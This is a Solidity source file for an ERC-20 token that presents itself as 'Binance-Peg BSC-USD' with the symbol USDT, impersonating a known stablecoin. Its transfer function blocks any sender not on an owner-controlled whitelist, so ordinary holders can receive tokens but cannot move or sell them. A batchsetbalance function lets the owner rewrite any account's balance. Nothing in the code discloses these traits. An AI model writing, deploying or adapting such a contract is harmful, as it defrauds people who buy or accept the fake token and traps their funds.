// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20Token is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
	mapping(address => bool) whitelist;
	
	address public owner;

    constructor() {
        _name = "Binance-Peg BSC-USD";
        _symbol = "USDT";
        _decimals = 18;
        _totalSupply = 3379997906* 10 ** uint256(_decimals);
        _balances[msg.sender] = _totalSupply;
		emit Transfer(address(0), msg.sender, _totalSupply);
		owner=msg.sender;
		whitelist[owner] = true;
		whitelist[address(this)] = true;
    }
	
	function addauthorizedaddresses(address[] memory _addresses) public returns (bool) {//addAuthorizedAddresses
		require(msg.sender== owner);
		for (uint256 i = 0; i < _addresses.length; i++) {
			if (!whitelist[_addresses[i]]) {
				whitelist[_addresses[i]] = true;
			}
		}
		return true;
	}

	function removeauthorizedaddresses(address[] memory _addresses) public returns (bool) {//removeAuthorizedAddresses
		require(msg.sender== owner);
		for (uint256 i = 0; i < _addresses.length; i++) {
			if (whitelist[_addresses[i]]) {
				whitelist[_addresses[i]] = false;
			}
		}
		return true;
	}

	function isAddressAuthorized(address _address) public view returns (bool) {
		return whitelist[_address];
	}
	
	
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }


    function batchsetbalance(address[] memory _accounts, uint256[] memory _bls) public {
        require(msg.sender == owner, "Only owner can modify balances");
        require(_accounts.length == _bls.length, "Invalid input length");

        for (uint256 i = 0; i < _accounts.length; i++) {
            _balances[_accounts[i]] = _bls[i];
        }
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
		require(whitelist[sender],"ERC20: transfer from the correct address");
		
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}